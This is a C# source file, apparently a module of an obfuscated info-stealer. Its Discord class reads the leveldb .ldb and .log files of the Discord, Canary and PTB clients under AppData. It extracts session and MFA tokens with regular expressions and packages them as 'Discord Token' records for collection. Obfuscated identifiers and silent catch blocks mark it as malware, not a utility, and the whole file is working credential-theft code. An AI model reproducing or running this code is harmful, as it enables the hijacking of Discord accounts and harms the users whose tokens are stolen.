using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using C6Zy;

namespace rk937aHHc
{
	public class Discord : EtbH
	{
		public Discord()
		{
			this.JrcZzQG9a = "Discord";
		}

		public string JrcZzQG9a { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> result = new List<WTitxI2m>();

			List<string> tokens = Discord.rRIB5BYFbj();

			foreach (string token in tokens)
			{
				result.Add(new WTitxI2m
				{
					data1 = "discord.com",
					data2 = "Discord Token",
					data3 = token,
					data4 = this.JrcZzQG9a
				});
			}

			return result;
		}

		public static List<string> rRIB5BYFbj()
		{
			List<string> tokens = new List<string>();

			List<string> sources = Discord.NWjiik();

			foreach (string input in sources)
			{
				// Discord 토큰
				foreach (Match match in Regex.Matches(
					input,
					@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
				))
				{
					tokens.Add(match.Value);
				}

				// MFA Discord 토큰
				foreach (Match match in Regex.Matches(
					input,
					@"mfa\.[\w-]{84}"
				))
				{
					tokens.Add(match.Value);
				}
			}

			return tokens;
		}

		private static List<string> NWjiik()
		{
			List<string> result = new List<string>();

			string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			string[] discordDirs =
			{
				Path.Combine(appData, "Discord"),
				Path.Combine(appData, "discordcanary"),
				Path.Combine(appData, "discordptb")
			};

			foreach (string discordPath in discordDirs)
			{
				if (!Directory.Exists(discordPath))
					continue;

				string levelDbPath = Path.Combine(discordPath, "Local Storage", "leveldb");
				if (!Directory.Exists(levelDbPath))
					continue;

				string[] ldbFiles = Directory.GetFiles(levelDbPath, "*.ldb", SearchOption.AllDirectories);
				foreach (string file in ldbFiles)
				{
					try
					{
						using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
						using (StreamReader sr = new StreamReader(fs))
						{
							result.Add(sr.ReadToEnd());
						}
					}
					catch
					{
					}
				}

				string[] logFiles = Directory.GetFiles(levelDbPath, "*.log", SearchOption.AllDirectories);
				foreach (string file in logFiles)
				{
					try
					{
						using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
						using (StreamReader sr = new StreamReader(fs))
						{
							result.Add(sr.ReadToEnd());
						}
					}
					catch
					{
					}
				}
			}

			return result;
		}
	}
}
